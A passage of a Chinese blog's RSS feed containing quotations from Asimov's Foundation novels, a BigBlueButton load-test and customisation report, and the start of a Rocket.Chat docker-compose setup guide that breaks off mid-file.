&lt;p&gt;他说的是：‘政府即人民’。” 谢顿点了点头。“嗯，你可知道，我相当认同这个想法。” “我也是，我全心全意赞成——假使久瑞南真是这个意思。但其实不是，他只是拿它当踏脚石。那是个手段，而不是目的。他要把丹莫茨尔赶下台，接下来，控制克里昂一世就很简单。然后久瑞南自己会坐上皇位，到时他就成了人民。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;除了谢顿自己，没人处理得了心理史学。假使他是因为受到强迫，才站到我们这边，那我们永远都无法确定他是否忠诚。他难道不会力陈某种行动方针，表面看来似乎对我们有利，但其实却经过巧妙设计，以致一段时日后，我们才发现自己一夕之间被摧毁了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;尤其是川陀人，他们宁死不愿困在原始的环境里，却喜欢梦想这种地方。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;民间故事通常都是世界性的，顶多只是面貌稍有不同&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对于热得快死的人，法律根本没法帮他降温&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;直觉是人类心灵特有的能力。能根据不完整，甚至可能造成误导的资料，归结出正确的答案，这种艺术就是直觉&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;是不是年轻时便显得老成，以免日后发生变化会比较好呢&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;当信仰影响到民众的信用点时，很快就不再受欢迎了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;历史证明语言的确能摇撼山岳&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我的观点是达尔人和其他人一样坏，他们希望受到平等待遇，他们也得到了，可是有机会的时候，他们却不愿平等对待别人。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他住在达尔，对平等思想很狂热，认为久瑞南的伟大只有达尔椰子霜才比得上&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你我的关系不是因爱结合的婚姻——那在一年内便会褪色——而是因互利而结合的婚姻，在我们有生之年都能持续不坠。我们要互相信任。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;首相不该有心软的时候，但谢顿早在当上首相前便已是谢顿&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“你是说，这谢顿是个算命的？” “心理史学不是普通的算命，它是一种科学。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你爱我，你的爱使我成了……人类&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;怜惜之余，想到自己这一生竟然没什么值得伤心的事，阿马瑞尔双颊不觉也垂下泪滴。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他操控人的心灵，就像你我操控语言一样容易&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;比自己年轻两岁，却过世了，多年的老友，竟然疏于联络到这种程度&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;心理史学通常被视为数学的一支，专门研究在某些特定的条件下，人类群体受到某种刺激之后的整体反应。换句话说。理论上，它能够预测社会与历史的变迁&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我有一种感觉，葛兰，文明的进步只不过是加强对隐私权的限制罢了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我唯一的过错是从不在乎人际关系，这一点我承认，对于那些还没老到无法掌权，却早就变成老糊涂的笨蛋，我在他们身上花的心思太少了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“每个人都只欣赏自己的故乡。”崔维兹随口答道，他有丰富的太空旅行经验，十分明白这个道理。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;看在宇宙所有黑洞份上，千万别去寻找第二基地&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;越接近真话的谎言越好，真话本身倘使运用得当，则能成为一则最佳的谎言。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这位阿姆女子立刻露出羞答答的笑容，看起来跟银河中任何一个女人都没有两样。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人类总是有一种倾向，认为自己的世界必定优于邻近世界，自己的文化比其他世界的更古老、更优越。其他世界拥有的好东西，都是从自己这里传过去的；而别人的坏东西，则是在流传的过程中遭到扭曲或误用，或者根本就是源自他处。另外还有一个共通的倾向，就是将优越与久远画上等号。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;那样的传说数之不尽。即使内容荒诞不经，外人从来不会买帐，但是在创造那些传说的世界上，由于本土意识作祟，人们总是拒绝否认&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;不论神话也好、传说也罢，都不可能完全凭空杜撰。任何事都不会无中生有，不论神话传说如何添油加醋，如何背离事实，后面必定隐藏着一个真实的核心&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我向银河中每一颗矮星发誓，我的确也有这种冲动。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;因为我们主宰着真正重要的事物。那些人拥有的物质文明产物，其实根本是微不足道的东西&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;典型的错觉之一，就是以为真正的力量必须表里一致&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我感觉你的精神很正常——但这或许是我的精神跟你一样不正常，也处于同样的幻觉之中。不过这种辩证一点用也没有。也许所有人类精神全不正常，全都陷于同一个幻觉之中，真实的宇宙可能是一片浑沌混乱，这种说法同样也无法反证。可是我们除了相信自己的理智之外，根本没有其他选择&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;鱼类、海豚、企鹅、乌贼这些据说是源自地球的生物，以及甚至不是地球物种的围韧，它们在黏滞介质中运动的办法，都是将身体演化成流线型。因此，这些生物的基因构造虽然截然不同，外型却没多大差别——文明的产物也可能如此。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 10 Jul 2016 00:00:00 +0000</pubDate><guid>tag:,2016-07-10:The-Foundation-Series.html</guid><category>book</category></item><item><title>bigbluebutton测试一例</title><link>/bigbluebutton-test.html</link><description>&lt;h1&gt;环境参数&lt;/h1&gt;
&lt;h3&gt;服务器&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;阿里云&lt;/li&gt;
&lt;li&gt;ubuntu14.04 64bit &lt;/li&gt;
&lt;li&gt;4核16G &lt;/li&gt;
&lt;li&gt;带宽按流量计，100M&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;软件&lt;/h3&gt;
&lt;p&gt;bigbluebutton 1.0版&lt;/p&gt;
&lt;h1&gt;压力情况&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;29人同时加入一个会议室&lt;/li&gt;
&lt;li&gt;24人同时开启麦克风和摄像头&lt;/li&gt;
&lt;li&gt;持续时间1.5小时（19:00-20:30）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参数监控&lt;/h1&gt;
&lt;p&gt;首先我们给出正常运行时，服务器的压力情况&lt;/p&gt;
&lt;p&gt;首先我们来看下cpu和内存使用情况:&lt;/p&gt;
&lt;p&gt;&lt;img alt="cpu1" src="img/bbbtest/cpu1.png" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="cpu2" src="img/bbbtest/cpu2.png" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="cpu3" src="img/bbbtest/cpu3.png" /&gt;&lt;/p&gt;
&lt;p&gt;从中可以看到cpu使用率在1/3左右，内存用了一半（8G，内存随人数的增加不明显）&lt;/p&gt;
&lt;p&gt;这是人员退出后的cpu/内存情况，可以看到内存变化不大：&lt;/p&gt;
&lt;p&gt;&lt;img alt="cpu4" src="img/bbbtest/cpu4.png" /&gt;&lt;/p&gt;
&lt;p&gt;m/mMISmi
接着我们看下网络使用情况：&lt;/p&gt;
&lt;p&gt;&lt;img alt="iftop" src="img/bbbtest/iftop.png" /&gt;&lt;/p&gt;
&lt;p&gt;从中可以看出，输出流量稳定在5-6 m/s,输入保持在500k/s (24人同时在线,无卡顿)&lt;/p&gt;
&lt;h1&gt;遇到的问题与解决方案&lt;/h1&gt;
&lt;h3&gt;问题&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;safari会出现卡顿或退出，声音断续&lt;/li&gt;
&lt;li&gt;无法将桌面布局同步到所有客户端(应该是软件问题,0.9版本正常)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;解决方案&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;浏览器卡顿与退出问题,通过采用chrome内核的浏览器可以解决（firefox和高版本ie也表现良好）&lt;/li&gt;
&lt;li&gt;无法同步所有客户端的问题，可以通过自建会议解决,详情请看后文&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;软件表现&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;在大多客户端下，视频和语音都正常&lt;/li&gt;
&lt;li&gt;ppt和即时消息都正常&lt;/li&gt;
&lt;li&gt;投票功能正常&lt;/li&gt;
&lt;li&gt;视频流畅，整体延迟在2秒以内，无卡顿&lt;/li&gt;
&lt;li&gt;语音清晰&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;结论&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;bigbluebutton在此次测试中表现优秀,可以完美支持小型会议&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;一些经验&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;浏览器需要支持flash，建议采用chrome内核的浏览器&lt;/li&gt;
&lt;li&gt;会议开始，应该向简单介绍bigbluebutton的使用方法，包括如何打开麦克风和摄像头以及举手发言之类的规则&lt;/li&gt;
&lt;li&gt;建议有个人负责给大家答疑，会议过程中与会者遇到使用问题应该即使给与解答，不影响会议主进程（可以建个qq群）&lt;/li&gt;
&lt;li&gt;当有人发言时，应当选择&lt;code&gt;演讲者外全部话筒静音&lt;/code&gt;，否则可能有杂音&lt;/li&gt;
&lt;li&gt;会议应该有个主控者，其他发言者通过举手发言,主控者可以在名字中标识,如&lt;code&gt;张三(主持人)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;软件定制相关&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;可以根据会议情况，定制入口页面，文件地址为&lt;code&gt;/var/www/bigbluebutton-default&lt;/code&gt;，其中index.html修改即生效，而&lt;code&gt;defautl.pdf&lt;/code&gt;是默认ppt，替换后需要&lt;code&gt;sudo bbb-conf --clean&lt;/code&gt;生效&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/lib/tomcat7/webapps/demo/demo1.jsp&lt;/code&gt;，修改即生效（修改api页面）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/lib/tomcat7/webapps/demo/demo_header.jsp&lt;/code&gt;,修改banner&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/lib/tomcat7/webapps/demo/create.jsp&lt;/code&gt;，修改自建会议的入口页&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;技巧：在&lt;code&gt;/var&lt;/code&gt;下使用&lt;code&gt;grep  "xxx" ./* -R&lt;/code&gt;搜索&lt;/p&gt;
&lt;h1&gt;自建会议&lt;/h1&gt;
&lt;p&gt;访问&lt;code&gt;http://YOUR_HOST/demo/demo1.jsp&lt;/code&gt;，点击create，然后建立你自己的会议,诸如我们将会议起名为wwj_meeting&lt;/p&gt;
&lt;p&gt;之后分享这个链接，其他人就能加入：&lt;code&gt;http://YOUR_HOST/demo/create.jsp?action=invite&amp;amp;meetingID=wwj_meeting%27s+meeting&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;自动加入的方式（可用js）为&lt;code&gt;http://YOUR_HOST/demo/create.jsp?username=小明&amp;amp;meetingID=wwj_meeting%27s+meeting&amp;amp;action=enter&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在自建会议中，创建者默认设为主持人，话筒不会出现被抢夺情况&lt;/p&gt;
&lt;p&gt;此外创建者可以同步页面给其他用户&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 06 Jul 2016 00:00:00 +0000</pubDate><guid>tag:,2016-07-06:bigbluebutton-test.html</guid><category>技术</category></item><item><title>为你的服务构建即时通讯和客服系统</title><link>/build-im.html</link><description>&lt;p&gt;这部分会作为下周去北京参加&lt;a href="http://www.meetup.com/Beijing-Open-edX-Meetup/"&gt;Beijing Open edX Meetup&lt;/a&gt;的分享之一，有兴趣的小伙伴可以到现场围观&lt;/p&gt;
&lt;p&gt;我将分享的另一个topic是《Open edX Architecture》&lt;/p&gt;
&lt;h1&gt;缘起&lt;/h1&gt;
&lt;p&gt;由于斯坦福跳票的缘故，edx迟迟没有内置的chat功能,几年前斯坦福大学团队准备实现这个功能，也加入到feature里了，最终没有实现，今年年初整个特性移除了。&lt;/p&gt;
&lt;p&gt;所以同学们只能自食其力了，所幸IM是个常用的功能，github里与许多很好的实现&lt;/p&gt;
&lt;p&gt;选型时权衡的因素主要包括社区热度，项目成熟程度，技术架构,拓展性&lt;/p&gt;
&lt;p&gt;对比了一番，我决定使用&lt;a href="https://github.com/RocketChat/Rocket.Chat"&gt;Rocket.Chat&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;Rocket.Chat&lt;/h1&gt;
&lt;p&gt;Rocket.Chat是自托管的chat服务,采用Meteor构建，具有许多优秀的特性&lt;/p&gt;
&lt;h3&gt;特性&lt;/h3&gt;
&lt;p&gt;主要吸引我的特性包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自托管，支持docker&lt;/li&gt;
&lt;li&gt;跨平台（web/mobile/desktop）&lt;/li&gt;
&lt;li&gt;私有群组&lt;/li&gt;
&lt;li&gt;桌面通知&lt;/li&gt;
&lt;li&gt;@某人&lt;/li&gt;
&lt;li&gt;Markdown支持&lt;/li&gt;
&lt;li&gt;Emojis&lt;/li&gt;
&lt;li&gt;内嵌多媒体&lt;/li&gt;
&lt;li&gt;超链智能解析预览&lt;/li&gt;
&lt;li&gt;文件上传&lt;/li&gt;
&lt;li&gt;全文搜索&lt;/li&gt;
&lt;li&gt;消息收藏&lt;/li&gt;
&lt;li&gt;客服系统&lt;/li&gt;
&lt;li&gt;I18N&lt;/li&gt;
&lt;li&gt;REST APIs&lt;/li&gt;
&lt;li&gt;支持webhook&lt;/li&gt;
&lt;li&gt;支持聊天机器人&lt;/li&gt;
&lt;li&gt;cas/oauth2&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们发现这是slack的绝佳替代。你可以通过cas/oauth2轻易地与你的系统整合，通过webhook和聊天机器人，你可以多系统做极大的拓展&lt;/p&gt;
&lt;p&gt;所有的特性如下:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;BYOS (bring your own server)&lt;/li&gt;
&lt;li&gt;Multiple Rooms&lt;/li&gt;
&lt;li&gt;Direct Messages&lt;/li&gt;
&lt;li&gt;Private Groups&lt;/li&gt;
&lt;li&gt;Public Channels&lt;/li&gt;
&lt;li&gt;Desktop Notifications&lt;/li&gt;
&lt;li&gt;Mentions&lt;/li&gt;
&lt;li&gt;Avatars&lt;/li&gt;
&lt;li&gt;Markdown&lt;/li&gt;
&lt;li&gt;Emojis&lt;/li&gt;
&lt;li&gt;Reactions&lt;/li&gt;
&lt;li&gt;TeX Math Rendering - inline math typesetting&lt;/li&gt;
&lt;li&gt;Media Embeds&lt;/li&gt;
&lt;li&gt;Link Previews&lt;/li&gt;
&lt;li&gt;Sent Message Edit and Deletion&lt;/li&gt;
&lt;li&gt;Transcripts / History&lt;/li&gt;
&lt;li&gt;File Upload / Sharing&lt;/li&gt;
&lt;li&gt;Scalable file sharing - S3 uploads with CDN downloads&lt;/li&gt;
&lt;li&gt;Full text search&lt;/li&gt;
&lt;li&gt;Live chat / Messaging call center&lt;/li&gt;
&lt;li&gt;LDAP Authentication&lt;/li&gt;
&lt;li&gt;CAS 1.0 support for education institutions and hosting providers worldwide&lt;/li&gt;
&lt;li&gt;Support for Okta SSO through SAML v2&lt;/li&gt;
&lt;li&gt;I18n - Supports 22 Languages&lt;/li&gt;
&lt;li&gt;Hubot Friendly&lt;/li&gt;
&lt;li&gt;(Beta) Face to Face Video Conferencing (aka WebRTC )&lt;/li&gt;
&lt;li&gt;(Beta) Multi-users Video Group Chat&lt;/li&gt;
&lt;li&gt;(Beta) Jitsi integration&lt;/li&gt;
&lt;li&gt;Audio calls&lt;/li&gt;
&lt;li&gt;Multi-users Audio Conference&lt;/li&gt;
&lt;li&gt;Screensharing&lt;/li&gt;
&lt;li&gt;XMPP bridge (try it)&lt;/li&gt;
&lt;li&gt;REST APIs&lt;/li&gt;
&lt;li&gt;Remote Locations Video Monitoring&lt;/li&gt;
&lt;li&gt;Native real-time APIs for Microsoft C#, Visual Basic, F# and other .NET supported languages (Get it!)&lt;/li&gt;
&lt;li&gt;API access from Perl and Java (community contributions)&lt;/li&gt;
&lt;li&gt;Chat-ops powered by Hubot: scalable horizontal app integration (early access)&lt;/li&gt;
&lt;li&gt;Massively scalable hosting and provisioning (beta testing now)&lt;/li&gt;
&lt;li&gt;Native Cross-Platform Desktop Application Windows, Mac OSX, or Linux&lt;/li&gt;
&lt;li&gt;Mobile app for iPhone, iPad, and iPod touch Download on AppStore!&lt;/li&gt;
&lt;li&gt;Mobile app for Android phone, tablet, and TV stick Available now on Google Play!&lt;/li&gt;
&lt;li&gt;Native Firefox OS Application (also for Desktop Firefox and Firefox for Android!) - Check the docs page for install instructions&lt;/li&gt;
&lt;li&gt;Sandstorm.io instant Rocket.Chat server Now on Sandstorm App Store&lt;/li&gt;
&lt;li&gt;Available on Cloudron Store&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;一图胜千言&lt;/h3&gt;
&lt;p&gt;&lt;img alt="chat" src="http://7xrc4h.com1.z0.glb.clouddn.com/chat.png" /&gt;&lt;/p&gt;
&lt;h3&gt;live demo&lt;/h3&gt;
&lt;p&gt;https://demo.rocket.chat/&lt;/p&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;p&gt;为了简化安装过程，我们采用docker(之后可以使用bitnami的发行版)，首先保证你装好了docker，关于docker的使用可以参考我的&lt;a href="http://blog.just4fun.site/docker-summary.html"&gt;docker使用小结&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我们采用docker-compose编排服务来编排容器，你可以采用pip来安装docker-compose：&lt;code&gt;pip install docker-compose&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;创建文件docker-compose.yml&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;db&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;image&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;mongo&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;volumes&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;$PWD/data:/data/db&lt;/span&gt;
    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;$PWD/dump:/dump&lt;/span&gt;
